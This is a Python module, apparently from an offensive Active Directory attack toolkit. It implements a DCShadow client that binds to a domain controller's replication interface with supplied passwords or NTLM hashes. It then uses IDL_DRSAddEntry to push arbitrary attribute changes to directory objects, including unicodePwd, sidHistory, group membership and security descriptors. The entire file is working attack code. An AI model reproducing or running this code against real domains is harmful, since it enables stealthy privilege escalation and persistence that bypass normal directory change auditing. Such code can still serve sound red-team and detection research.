"""Minimal MS-DRSR IDL_DRSAddEntry (opnum 17) client for DCShadow pushes.

Stock impacket exposes ENTINF / ATTR helpers used by GetNCChanges but does not
ship the AddEntry request/response NDRCALLs. This module defines them inline
the same way ``drs_sidhistory`` defines DRSAddSidHistory.

Typical DCShadow flow after planting server/nTDSDSA objects:
bind as a replication principal → DRSAddEntry with ``ENTINF_REMOTE_MODIFY``
carrying the attribute change to push.
"""

from __future__ import annotations

from typing import Any, ClassVar

from adaf_attack.core.impacket_helper import require_impacket

OPNUM_DRS_ADD_ENTRY = 17
ENTINF_REMOTE_MODIFY = 0x00010000

# LDAP display name (normalized) → attribute OID. Callers may also pass a
# dotted OID directly. Values follow MS-ADA / X.500 assignments.
_ATTR_OIDS: dict[str, str] = {
    "description": "2.5.4.13",
    "displayname": "1.2.840.113556.1.2.13",
    "samaccountname": "1.2.840.113556.1.4.221",
    "unicodepwd": "1.2.840.113556.1.4.90",
    "primarygroupid": "1.2.840.113556.1.4.98",
    "member": "1.2.840.113556.1.2.102",
    "serviceprincipalname": "1.2.840.113556.1.4.415",
    "useraccountcontrol": "1.2.840.113556.1.4.8",
    "sidhistory": "1.2.840.113556.1.4.609",
    "ntsecuritydescriptor": "1.2.840.113556.1.2.281",
    "objectclass": "2.5.4.0",
    "sn": "2.5.4.4",
    "givenname": "2.5.4.42",
}

_STRUCTURES: tuple[type[Any], type[Any]] | None = None


def _attr_oid(attribute: str) -> str:
    text = attribute.strip()
    if not text:
        raise RuntimeError("attribute name/OID must be non-empty")
    if text[0].isdigit():
        return text
    key = text.lower().replace("-", "").replace("_", "")
    if key in _ATTR_OIDS:
        return _ATTR_OIDS[key]
    raise RuntimeError(
        f"Unknown attribute {attribute!r}; pass a dotted OID "
        f"(e.g. 2.5.4.13) or one of: {', '.join(sorted(_ATTR_OIDS))}"
    )


def _structures() -> tuple[type[Any], type[Any]]:
    global _STRUCTURES
    if _STRUCTURES is not None:
        return _STRUCTURES
    from impacket.dcerpc.v5.drsuapi import DRS_HANDLE, ENTINF, NT4SID, PDSNAME
    from impacket.dcerpc.v5.dtypes import DWORD, GUID, ULONG, USHORT
    from impacket.dcerpc.v5.ndr import (
        NDRCALL,
        NDRPOINTER,
        NDRSTRUCT,
        NDRUNION,
        NDRUniConformantArray,
    )

    class PENTINFLIST(NDRPOINTER):  # type: ignore[misc]
        pass

    class ENTINFLIST(NDRSTRUCT):  # type: ignore[misc]
        structure = (
            ("pNextEntInf", PENTINFLIST),
            ("Entinf", ENTINF),
        )

    PENTINFLIST.referent = (("Data", ENTINFLIST),)

    class DrsMsgAddEntryReqV2(NDRSTRUCT):  # type: ignore[misc]
        structure = (("EntInfList", ENTINFLIST),)

    class DrsMsgAddEntryReq(NDRUNION):  # type: ignore[misc]
        commonHdr = (("tag", DWORD),)  # noqa: N815
        union: ClassVar[dict[int, tuple[str, type[Any]]]] = {
            2: ("V2", DrsMsgAddEntryReqV2),
        }

    class AddEntryReplyInfo(NDRSTRUCT):  # type: ignore[misc]
        structure = (
            ("objGuid", GUID),
            ("objSid", NT4SID),
        )

    class AddEntryReplyInfoArray(NDRUniConformantArray):  # type: ignore[misc]
        item = AddEntryReplyInfo

    class PAddEntryReplyInfoArray(NDRPOINTER):  # type: ignore[misc]
        referent = (("Data", AddEntryReplyInfoArray),)

    class DrsMsgAddEntryReplyV2(NDRSTRUCT):  # type: ignore[misc]
        structure = (
            ("pErrorObject", PDSNAME),
            ("errCode", DWORD),
            ("dsid", DWORD),
            ("extendedErr", DWORD),
            ("extendedData", DWORD),
            ("problem", USHORT),
            ("cObjectsAdded", ULONG),
            ("infoList", PAddEntryReplyInfoArray),
        )

    class DrsMsgAddEntryReply(NDRUNION):  # type: ignore[misc]
        commonHdr = (("tag", DWORD),)  # noqa: N815
        union: ClassVar[dict[int, tuple[str, type[Any]]]] = {
            2: ("V2", DrsMsgAddEntryReplyV2),
        }

    class DRSAddEntry(NDRCALL):  # type: ignore[misc]
        opnum = OPNUM_DRS_ADD_ENTRY
        structure = (
            ("hDrs", DRS_HANDLE),
            ("dwInVersion", DWORD),
            ("pmsgIn", DrsMsgAddEntryReq),
        )

    class DRSAddEntryResponse(NDRCALL):  # type: ignore[misc]
        structure = (
            ("pdwOutVersion", DWORD),
            ("pmsgOut", DrsMsgAddEntryReply),
            ("ErrorCode", DWORD),
        )

    _STRUCTURES = (DRSAddEntry, DRSAddEntryResponse)
    return _STRUCTURES


def _build_dsname(dn: str) -> Any:
    from impacket.dcerpc.v5.drsuapi import DSNAME, NULLGUID

    name = dn if dn.endswith("\x00") else dn + "\x00"
    dsname = DSNAME()
    dsname["SidLen"] = 0
    dsname["Guid"] = NULLGUID
    dsname["Sid"] = b"\x00" * 28
    dsname["NameLen"] = len(dn)
    dsname["StringName"] = name
    dsname["structLen"] = 4 + 4 + 16 + 28 + 4 + (len(name) * 2)
    return dsname


def add_entry_modify(
    target: Any,
    *,
    object_dn: str,
    attribute: str,
    value: str | bytes,
    prefix_table: list[Any] | None = None,
) -> dict[str, Any]:
    """Push an attribute modification via IDL_DRSAddEntry (ENTINF_REMOTE_MODIFY)."""
    require_impacket("dcshadow")
    from impacket.dcerpc.v5 import rpcrt
    from impacket.dcerpc.v5 import transport as dcerpc_transport
    from impacket.dcerpc.v5.drsuapi import (
        ATTR,
        ATTRVAL,
        MSRPC_UUID_DRSUAPI,
        NULL,
        DRSBind,
        MakeAttid,
    )
    from impacket.dcerpc.v5.dtypes import NULL as DTYPES_NULL

    request_cls, _response_cls = _structures()
    oid = _attr_oid(attribute)
    payload: dict[str, Any] = {
        "method": "drsuapi",
        "object_dn": object_dn,
        "attribute": attribute,
        "attribute_oid": oid,
        "error": None,
        "error_code": None,
    }

    rpc_transport = dcerpc_transport.SMBTransport(target.dc_ip, filename=r"\pipe\lsass")
    lm, nt = target.lm_nt_hashes()
    rpc_transport.set_credentials(
        target.username or "",
        target.password or "",
        target.domain,
        lm,
        nt,
        aesKey=target.aes_key or "",
    )
    dce = None
    handle = None
    try:
        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(MSRPC_UUID_DRSUAPI)
        bind = DRSBind()
        bind["puuidClientDsa"] = NULL
        bind["pextClient"] = NULL
        bind_resp = dce.request(bind)
        bind_code = int(bind_resp["ErrorCode"])
        if bind_code != 0:
            payload["ok"] = False
            payload["stage"] = "bind"
            payload["error"] = f"DRSBind rejected: hresult 0x{bind_code & 0xFFFFFFFF:08x}"
            payload["error_code"] = bind_code
            return payload
        handle = bind_resp["phDrs"]

        table: list[Any] = list(prefix_table or [])
        attid = MakeAttid(table, oid)

        raw = value.encode("utf-16-le") if isinstance(value, str) else value
        attr_val = ATTRVAL()
        attr_val["valLen"] = len(raw)
        attr_val["pVal"] = list(raw)

        attr = ATTR()
        attr["attrTyp"] = attid
        attr["AttrVal"]["valCount"] = 1
        attr["AttrVal"]["pAVal"] = [attr_val]

        req = request_cls()
        req["hDrs"] = handle
        req["dwInVersion"] = 2
        req["pmsgIn"]["tag"] = 2
        ent = req["pmsgIn"]["V2"]["EntInfList"]["Entinf"]
        ent["pName"] = _build_dsname(object_dn)
        ent["ulFlags"] = ENTINF_REMOTE_MODIFY
        ent["AttrBlock"]["attrCount"] = 1
        ent["AttrBlock"]["pAttr"] = [attr]
        req["pmsgIn"]["V2"]["EntInfList"]["pNextEntInf"] = DTYPES_NULL

        try:
            resp = dce.request(req)
        except rpcrt.DCERPCException as exc:
            payload["ok"] = False
            payload["stage"] = "addentry"
            payload["error"] = str(exc)
            return payload

        code = int(resp["ErrorCode"])
        payload["error_code"] = code
        if code != 0:
            payload["ok"] = False
            payload["stage"] = "addentry"
            payload["error"] = f"DRSAddEntry failed: hresult 0x{code & 0xFFFFFFFF:08x}"
            return payload

        try:
            out_ver = int(resp["pdwOutVersion"])
            if out_ver == 2:
                err = int(resp["pmsgOut"]["V2"]["errCode"])
                payload["reply_err_code"] = err
                if err != 0:
                    payload["ok"] = False
                    payload["stage"] = "addentry"
                    payload["error"] = f"DRSAddEntry reply errCode={err}"
                    return payload
        except Exception:
            pass
        payload["ok"] = True
        return payload
    except Exception as exc:
        text = str(exc).lower()
        payload["ok"] = False
        payload.setdefault("stage", "connect")
        if "access_denied" in text or "access denied" in text:
            payload["error"] = (
                "drsuapi DRSAddEntry requires replication rights on the DC (access denied)"
            )
        else:
            payload["error"] = str(exc)
        return payload
    finally:
        if handle is not None and dce is not None:
            try:
                from impacket.dcerpc.v5.drsuapi import DRSUnbind

                unbind = DRSUnbind()
                unbind["phDrs"] = handle
                dce.request(unbind)
            except Exception:
                pass
